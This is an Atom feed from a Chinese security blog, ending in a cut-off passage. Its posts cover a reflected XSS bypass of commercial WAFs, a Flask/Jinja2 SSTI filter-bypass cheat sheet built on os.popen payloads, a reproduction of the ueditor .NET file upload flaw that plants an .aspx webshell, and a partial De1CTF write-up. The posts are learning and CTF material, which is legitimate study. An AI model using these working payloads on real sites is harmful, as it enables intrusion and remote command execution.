<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>悦昕_o&#39;s Blog</title>
  
  <subtitle>不来不去 如来 o(*￣▽￣*)ブ</subtitle>
  <link href="https://leonardo-o1.github.io/atom.xml" rel="self"/>
  
  <link href="https://leonardo-o1.github.io/"/>
  <updated>2021-05-29T09:40:24.985Z</updated>
  <id>https://leonardo-o1.github.io/</id>
  
  <author>
    <name>悦昕_o</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>记一次反射型xss绕waf</title>
    <link href="https://leonardo-o1.github.io/2021/05/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E7%BB%95waf/"/>
    <id>https://leonardo-o1.github.io/2021/05/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E7%BB%95waf/</id>
    <published>2021-05-28T02:28:37.000Z</published>
    <updated>2021-05-29T09:40:24.985Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><blockquote><p>网站使用了奇安信的网站卫士和安域云waf。</p></blockquote><p>话不多说，直接开始：<br>有两个参数直接放在了a标签内，于是尝试xss<br><img src="/2021/05/28/记一次反射型xss绕waf/20210526180613753_27327.png" alt></p><p>输入了一个双引号，发现没有被转义；<br><img src="/2021/05/28/记一次反射型xss绕waf/20210526181552991_24103.png" alt></p><p>测试时，发现大部分on事件+等号被拦，<br><img src="/2021/05/28/记一次反射型xss绕waf/20210527215545865_10259.png" alt><br>发现一个可用的事件：ondblclick，继续测试；<br><img src="/2021/05/28/记一次反射型xss绕waf/20210527220511077_9026.png" alt><br>在当前payload：<code>&quot;&gt;&lt;img ondblclick=&quot;</code>引号后面不论输入什么都会被拦<br><img src="/2021/05/28/记一次反射型xss绕waf/20210527220732394_11457.png" alt><br>在输入一个<code>+</code>时，发现payload过了，而且发现<code>;</code>未被拦截；于是最新的payload为：<code>&quot;&gt;&lt;img+ondblclick=&quot;a+;</code><br><img src="/2021/05/28/记一次反射型xss绕waf/20210527221235073_6492.png" alt><br>尝试使用unicode编码执行alert()，被拦了；<br><img src="/2021/05/28/记一次反射型xss绕waf/20210527223103897_8674.png" alt><br>尝试使用top属性，发现未被拦截，更新payload为：<code>&quot;&gt;&lt;img+src%3d1+ondblclick=&quot;a+;top[`al`%2b`ert`]`1`</code><br><img src="/2021/05/28/记一次反射型xss绕waf/20210527222751499_20916.png" alt><br>为了使事件内的js语句能正确执行，稍微调整简化一下payload，将<code>a+</code>改为<code>1+</code>：<code>&quot;&gt;&lt;img+src%3d1+ondblclick=&quot;1+;top[`al`%2b`ert`]`1`</code>。（复盘时发现事件引号内重点在有个<code>+(即空格)</code>，前面可以不用字符，也就不用分号结束了）<br>使用上述payload在浏览器中测试，双击触发js语句；<br><img src="/2021/05/28/记一次反射型xss绕waf/20210527230419797_13707.png" alt></p><p>写在最后：之前有尝试关键字内嵌分隔符（tab键）来绕waf，当时测试绕过了waf，但语句未执行（之后复盘发现语句为执行的原因是tab键的编码写错了，应该是<code>%09</code>，<code>%08</code>是退格符），当时的payload:<br><code>&quot;&gt;&lt;a href=&quot;javas%08cript:self[Object.keys(self)[7]](1)</code></p><p>总结：<br>本文主要通过找到一个可用的on事件+事件内输入一个空格扰乱了检测规则，总的来说，对于这种基于正则的waf，我们可以尝试猜测其大致的正则形式，再对其进行绕过。本文是一篇简单的反射型xss绕waf的记录，旨在能渐渐养成写文的习惯。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;blockquote&gt;
&lt;p&gt;网站使用了奇安信的网站卫士和安域云waf。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;话不多说，直接开始：&lt;br&gt;有两个参数直接放在了a标签内，于是尝试xss&lt;br&gt;&lt;img src=&quot;/2021/05/28/记</summary>
      
    
    
    
    <category term="杂记" scheme="https://leonardo-o1.github.io/categories/杂记/"/>
    
    
    <category term="xss" scheme="https://leonardo-o1.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>记录-python模块注入bypass</title>
    <link href="https://leonardo-o1.github.io/2020/08/05/%E8%AE%B0%E5%BD%95-python%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5bypass/"/>
    <id>https://leonardo-o1.github.io/2020/08/05/%E8%AE%B0%E5%BD%95-python%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5bypass/</id>
    <published>2020-08-05T07:25:09.000Z</published>
    <updated>2021-05-29T06:43:05.340Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-获取基本类"><a href="#0x01-获取基本类" class="headerlink" title="0x01 获取基本类"></a>0x01 获取基本类</h2><p>可以通过python的一些基本类，jinja2中的内置对象、内置函数（比如对象request，函数url_for和get_flashed_messages）；有时候可能需要结合实际情况进行一些变动。</p><blockquote><p>Flask 的一些内置函数、内置对象：<br>内置对象：<code>request, config, session, g, current_app等</code><br>内置函数：<code>url_for, get_flashed_messages等</code><br>jinja2内置全局函数：<code>dict(), joiner(), cycler, lipsum, range, namespace等</code></p><p>如果还要更多可用函数、对象；可以从这几个方向查找文档：① Flask 的内置函数、对象。② 模板引擎<a href="https://jinja.palletsprojects.com/en/2.11.x/templates/?highlight=joiner#list-of-global-functions" target="_blank" rel="noopener">jinja2</a>的内置函数、对象。</p></blockquote><p>以下是获取基类的一些实现方法：</p><ul><li><code>&#39;&#39;.__class__.__mro__[1]</code></li><li><code>{}.__class__.__bases__[0]</code></li><li><code>().__class__.__bases__[0]</code></li><li><code>[].__class__.__bases__[0]</code></li><li><code>request.__class__.__mro__[8]</code></li></ul><h2 id="0x02-bypass绕过"><a href="#0x02-bypass绕过" class="headerlink" title="0x02 bypass绕过"></a>0x02 bypass绕过</h2><ul><li><h3 id="中括号被过滤"><a href="#中括号被过滤" class="headerlink" title="中括号被过滤"></a>中括号被过滤</h3></li></ul><ol><li><p>使用 <strong><code>__getitem__()</code></strong> 进行绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__mro__[i]</span><br><span class="line"><span class="comment">#等价于</span></span><br><span class="line">__mro__.__getitem(i)</span><br></pre></td></tr></table></figure></li><li><p><strong>pop()</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__subclasses__()[i]</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">__subclasses__().pop(i)</span><br></pre></td></tr></table></figure></li><li><p><strong><code>__bases__.0.</code></strong>(这个本地测试未成功)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__<span class="number">.0</span>.__subclasses__()<span class="number">.59</span>.__init__.__globals__.linecache.os.popen(<span class="string">'whoami'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><h3 id="引号被过滤"><a href="#引号被过滤" class="headerlink" title="引号被过滤"></a>引号被过滤</h3></li></ul><ol><li>将需要的函数或值放在请求中作为参数，借助<code>request</code>对象获取值（这种方法在沙盒逃逸中行不通，只有web接收参数形式有可能），如果是函数，还需配合<code>attr</code>或<code>__getattribute__</code>获得。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># request.args.key, request.values.key</span></span><br><span class="line"><span class="comment"># 1、利用request对象获取值：</span></span><br><span class="line">&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">300</span>].__init__.__globals__.os.popen(request.args.a).read()&#125;&#125;&amp;a=dir</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2、request对象配合`attr`或`__getattribute__`从请求参数处获取函数：</span></span><br><span class="line">&#123;&#123; config|attr(request.args.a) &#125;&#125;&amp;a=__class__</span><br><span class="line">&#123;&#123; config.__getattribute__(request.args.a) &#125;&#125;&amp;a=__class__</span><br></pre></td></tr></table></figure></li></ol><p>另，如果request被过滤了，可以利用<code>__str__</code>拼接出想要的字符串： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__str__()[<span class="number">3</span>]+config.__str__()[<span class="number">2</span>] &#125;&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>找出chr函数，利用set复制，然后使用。（<em>TODO：或许也可以试着用<code>__str__</code>拼接？</em> ）<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">92</span>].__init__.__globals__.__builtins__.chr %&#125;</span><br><span class="line">&#123;&#123;[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">300</span>].__init__.__globals__.os.popen(chr(<span class="number">100</span>)%<span class="number">2</span>bchr(<span class="number">105</span>)%<span class="number">2</span>bchr(<span class="number">114</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure></li></ol><p><img src="/2020/08/05/记录-python模块注入bypass/20200805112412104_6963.jpg" alt="2020-08-05_110854"></p><ul><li><h3 id="双下划线（-）被过滤"><a href="#双下划线（-）被过滤" class="headerlink" title="双下划线（__）被过滤"></a>双下划线（__）被过滤</h3></li></ul><ol><li>借助<code>request</code>对象<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如：</span></span><br><span class="line">&#123;&#123;''[request.values.class]&#125;&#125;&amp;class=__class__</span><br><span class="line">&#123;&#123; config|attr(request.args.a) &#125;&#125;&amp;a=__class__</span><br></pre></td></tr></table></figure></li></ol><ul><li><h3 id="被过滤"><a href="#被过滤" class="headerlink" title="{ {被过滤"></a><code>{ {</code>被过滤</h3><p>可以利用<code>{ % payload % }</code>标记，可以考虑盲注或带外（如<code>curl</code>）。<br>结构如： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">""</span>.__class__ %&#125;test&#123;% endif %&#125;</span><br></pre></td></tr></table></figure></li><li><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3></li></ul><ol><li><p>拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如：</span></span><br><span class="line">&#123;&#123; session[<span class="string">'__cla'</span>+<span class="string">'ss__'</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>].__bases__[<span class="number">0</span>][<span class="string">'__subcla'</span>+<span class="string">'sses__'</span>]()[<span class="number">117</span>].__init__.__globals__[<span class="string">'po'</span>+<span class="string">'pen'</span>](<span class="string">'cat /flag'</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure></li><li><p>编码（未深入研究）<br>编码方式包括但不限于：base64、rot13、16进制编码等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__[<span class="string">'eval'</span>](<span class="string">"__import__('os').popen('ls').read()"</span>)</span><br><span class="line"><span class="comment"># 等价于：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__[<span class="string">'ZXZhbA=='</span>.decode(<span class="string">'base64'</span>)](<span class="string">"X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk="</span>.decode(<span class="string">'base64'</span>))</span><br></pre></td></tr></table></figure></li></ol><h2 id="0x03-其他"><a href="#0x03-其他" class="headerlink" title="0x03 其他"></a>0x03 其他</h2><ul><li><p>reload方法：如果内建函数大部分被删除，可用reload进行重载。如：<code>reload(__builtins__)</code>。</p></li><li><p>python环境常用命令执行方法（未深入）</p><ul><li>os.system(command)</li><li>os.popen(command[,mode[,bufsize]])</li><li>subprocess</li></ul></li><li><p>flask框架request获取参数的一些基本用法</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">request.method 　　　　　　<span class="comment">#获取请求方法</span></span><br><span class="line">request.form 　　　　　　<span class="comment">#获取post请求所有参数</span></span><br><span class="line">request.form.get(<span class="string">"name"</span>) 　　　　　　<span class="comment">#获取post请求body中参数key为name的value参数</span></span><br><span class="line">request.args 　　　　　　<span class="comment">#获取get请求所有参数</span></span><br><span class="line">request.args.get(<span class="string">"name"</span>) 　　　　　　<span class="comment">#获取get请求url参数中key为name的value参数</span></span><br><span class="line">request.values 　　　　　　<span class="comment">#获取get、post请求参数</span></span><br><span class="line">request.cookies 　　　　　　<span class="comment">#获取请求的cookies</span></span><br><span class="line">request.headers 　　　　　　<span class="comment">#获取所有头部信息</span></span><br><span class="line">request.headers.get(<span class="string">"User-Agent"</span>)  　　　　　　<span class="comment">#获取头部信息中User-Agent信息</span></span><br><span class="line">request.url 　　　　　　<span class="comment">#获取请求的完整url：http://127.0.0.1:8080/integration/qryUserActivity.sync?mobile=15013440000&amp;id=123456</span></span><br><span class="line">request.script_root</span><br><span class="line">request.path 　　　　　　<span class="comment">#获取请求的资源地址：/integration/qryUserActivity.sync</span></span><br><span class="line">request.base_url 　　　　　　<span class="comment">#获取请求的基础地址：http://127.0.0.1:8081/integration/qryUserActivity.sync</span></span><br><span class="line">request.url_root 　　　　　　<span class="comment">#获取服务器与端口地址：http://127.0.0.1:8081/</span></span><br><span class="line">request.files(<span class="string">"filename"</span>) 　　　　　　<span class="comment">#获取请求时上传的文件，filename为文件名字</span></span><br><span class="line"><span class="comment"># 更多功能见(https://dormousehole.readthedocs.io/en/latest/search.html?q=request)。</span></span><br></pre></td></tr></table></figure></li></ul><p>参考：</p><ul><li><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">Flask/Jinja2模板注入中的一些绕过姿势</a></li><li><a href="https://xz.aliyun.com/t/8029" target="_blank" rel="noopener">浅谈flask ssti 绕过原理</a></li><li><a href="https://evi0s.com/2018/11/26/深入ssti-从nctf2018两道flask看bypass新姿势/" target="_blank" rel="noopener">深入SSTI-从NCTF2018两道Flask看bypass新姿势</a></li><li><a href="https://www.anquanke.com/post/id/188172#h3-16" target="_blank" rel="noopener">SSTI/沙盒逃逸详细总结</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x01-获取基本类&quot;&gt;&lt;a href=&quot;#0x01-获取基本类&quot; class=&quot;headerlink&quot; title=&quot;0x01 获取基本类&quot;&gt;&lt;/a&gt;0x01 获取基本类&lt;/h2&gt;&lt;p&gt;可以通过python的一些基本类，jinja2中的内置对象、内置函数（比如对</summary>
      
    
    
    
    <category term="漏洞学习" scheme="https://leonardo-o1.github.io/categories/漏洞学习/"/>
    
    
    <category term="记录" scheme="https://leonardo-o1.github.io/tags/记录/"/>
    
  </entry>
  
  <entry>
    <title>ueditor 1.4.3.3 .net版 任意文件上传漏洞分析与复现</title>
    <link href="https://leonardo-o1.github.io/2020/07/26/ueditor-1-4-3-3-net%E7%89%88-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://leonardo-o1.github.io/2020/07/26/ueditor-1-4-3-3-net%E7%89%88-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-07-26T09:47:21.000Z</published>
    <updated>2021-04-28T13:47:31.999Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>环境：asp.net</p></blockquote><a id="more"></a><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>1、准备一个vps放需上传的文件，文件后缀名可正常命名；本地需准备一个可以上传的表单。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">祖传表单：</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1:8888/ueditor/net/controller.ashx?action=catchimage"</span> <span class="attr">enctype</span>=<span class="string">"application/x-www-form-urlencoded"</span>  <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>shell addr: <span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">"width: 20%"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"source[]"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2、在本地上传处写入构造好的文件地址，关于如何构造地址，我的理解是需满足两点：① 访问地址可以正常解析图片。② url以<code>.aspx或.asp</code>结尾。<br>如<code>http://x.x.x.x/blank.jpg?.aspx</code>，其中<code>?</code>也可换成<code>#</code>，<code>#</code>后面也可以跟任意符号（<code>#</code>及之后出现的字符都不会在http的请求中），成功上传后会返回文件路径。<br><img src="/2020/07/26/ueditor-1-4-3-3-net版-任意文件上传漏洞分析与复现/20200724153620173_28097.png" alt="ff"><br>上传成功后返回路径：<br><img src="/2020/07/26/ueditor-1-4-3-3-net版-任意文件上传漏洞分析与复现/20200724153758255_13160.png" alt="上传成功后返回文件路径"><br>3、得到上传后的文件路径为<code>http://127.0.0.1:8888/ueditor/net/upload/image/20200724/6373120182442592589757697.aspx</code>，蚁剑连接，成功getshell。<br><img src="/2020/07/26/ueditor-1-4-3-3-net版-任意文件上传漏洞分析与复现/20200724154444104_19151.png" alt></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>1、本次任意文件上传主要是<code>action=catchimage</code>产生的，可以看到，在<code>catchimage</code>这个分支下，其实例化了<code>CrawlerHandler</code>这个类。<br><img src="/2020/07/26/ueditor-1-4-3-3-net版-任意文件上传漏洞分析与复现/20200726164955484_11867.png" alt><br>2、跟进这个类<code>CrawlerHandler</code>，发现在该类中对于上传的文件，只通过校验<code>ContentType</code>来判断是否为图片，未对文件后缀进行正确的校验；<br><img src="/2020/07/26/ueditor-1-4-3-3-net版-任意文件上传漏洞分析与复现/20200726162359210_25351.png" alt></p><p>3、而满足条件的文件上传成功后会被重新命名（<code>PathFormatter.Format()</code>），命名文件后缀时，是选取url地址的扩展名作为重命名后文件的后缀，这就给了我们可以操作的空间。只要我们制作一个图片马，便可绕过前面对于文件类型的限制；并将图片地址构造出以<code>.asp或.aspx</code>结尾的url，就能得到一个重命名后后缀为<code>.asp或.aspx</code>的文件。<br><img src="/2020/07/26/ueditor-1-4-3-3-net版-任意文件上传漏洞分析与复现/20200726163231036_22537.png" alt></p><h2 id="一点小坑"><a href="#一点小坑" class="headerlink" title="一点小坑"></a>一点小坑</h2><p>1、仅.net版本存在该漏洞。<br>由于对asp和asp.net的不熟悉，并且当时下载页面没有.net的选项，导致我以为下载的asp版的就是有问题的.net版本，结果死活复现不成功，后来发现问题，去<a href="https://github.com/fex-team/ueditor/releases" target="_blank" rel="noopener">github</a>上找到的.net版。</p><p>2、测试上传时，给的url地址不能是内网地址，因此需要一个vps。<br><img src="/2020/07/26/ueditor-1-4-3-3-net版-任意文件上传漏洞分析与复现/20200726164206312_23589.png" alt></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;环境：asp.net&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="漏洞学习" scheme="https://leonardo-o1.github.io/categories/漏洞学习/"/>
    
    <category term="复现" scheme="https://leonardo-o1.github.io/categories/漏洞学习/复现/"/>
    
    
    <category term="web漏洞" scheme="https://leonardo-o1.github.io/tags/web漏洞/"/>
    
  </entry>
  
  <entry>
    <title>De1CTF部分wp</title>
    <link href="https://leonardo-o1.github.io/2019/09/12/De1CTF-wp/"/>
    <id>https://leonardo-o1.github.io/2019/09/12/De1CTF-wp/</id>
    <published>2019-09-12T01:24:17.000Z</published>
    <updated>2019-09-12T02:01:19.221Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这是之前比赛后不久就写的wp，一直没有放出来，清理东西的时候看到了就想着先放出来吧（虽然我还没写完o(╯□╰)o，有时间在补吧。嘻嘻(#^.^#)）</p></blockquote><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="SSRF-Me"><a href="#SSRF-Me" class="headerlink" title="SSRF Me"></a>SSRF Me</h3><p>赛题链接：<a href="http://139.180.128.86/" target="_blank" rel="noopener">http://139.180.128.86/</a></p><p>打开链接可以看到一段代码（查看源代码会有格式）</p><p><img src="/2019/09/12/De1CTF-wp/QQ%E6%88%AA%E5%9B%BE20190805090902.png" alt="QQ截图20190805090902"></p><p>对代码进行分析，可以看到有<code>/geneSign</code>和 <code>/De1ta</code>两个访问路径;<code>/geneSign</code>用来生成签名，get或post请求带个<code>param</code>参数，把<code>param</code>参数和<code>action</code>值传递给<code>getSign()</code>进行加密生成签名。</p><p><code>/De1ta</code>才是重头戏（O(∩_∩)O哈哈~），访问该路径需要cookie设置action、sign，get请求带参param，<code>challenge()</code>调用<code>waf()</code>对<code>param</code>进行过滤：<code>不能以gopher和file开头</code>，然后调用Task类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span> <span class="comment"># 生成签名</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))   <span class="comment"># 对get请求的 param 参数进行url解码</span></span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)   <span class="comment">#调用 getSign 函数（在下面） </span></span><br><span class="line">    <span class="comment"># secert_key = os.urandom(16)-(16个字节随机数)-- </span></span><br><span class="line">    <span class="comment"># param=get请求的param参数 </span></span><br><span class="line">    <span class="comment"># action='scan' </span></span><br><span class="line">    <span class="comment"># 返回三者md5后的结果 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))  <span class="comment"># cookie设置action,sign get参数param</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr    <span class="comment"># 获取ip</span></span><br><span class="line">    <span class="keyword">if</span>(waf(param)): <span class="comment"># 对param参数过滤，函数在下面</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)    <span class="comment">#调用类Task 上面 初始化 创建md5(ip)为名的文件夹</span></span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())  <span class="comment">#执行task.Exec() 并将输出序列化</span></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span> <span class="comment">#过滤函数 去掉param左右空格并小写化 不能以 gopher和file 开头</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>函数<code>getSign()</code>，由于实际上只有param可控，action默认‘scan’，但是secert_key的长度我们是知道的，因此这里存在哈希长度扩展攻击（<a href="https://www.freebuf.com/articles/web/69264.html" target="_blank" rel="noopener">了解哈希长度扩展攻击可以看看这篇文章</a>），因此我们可以通过工具构造不同action的签名（工具我使用的是<strong>HashPump</strong>）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span>     <span class="comment"># secert_key = os.urandom(16)-(16个字节随机数) param=get请求的param参数 action='scan'</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure><p>类<code>Task</code>，分析代码我们知道只要能让访问<code>/De1ta</code>所带的参数实现<code>getSign(self.action, self.param) == self.sign</code>就能通过<code>checkSign()</code>的验证，这里我们可以用前面提到的哈希长度扩展攻击来构造出我们想要的参数；可以看到我们需要走通<code>if &quot;scan&quot; in self.action:</code>来读取param参数的文件并把它存在一个result.txt文件中，然后当<code>if &quot;read&quot; in self.action:</code>成立时再去读取result.txt，并返回读取到的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr 创建一个md5(ip)为名的文件夹 15121d42524062a01cf877e045146508</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):  <span class="comment">#'验证签名'</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)   <span class="comment"># 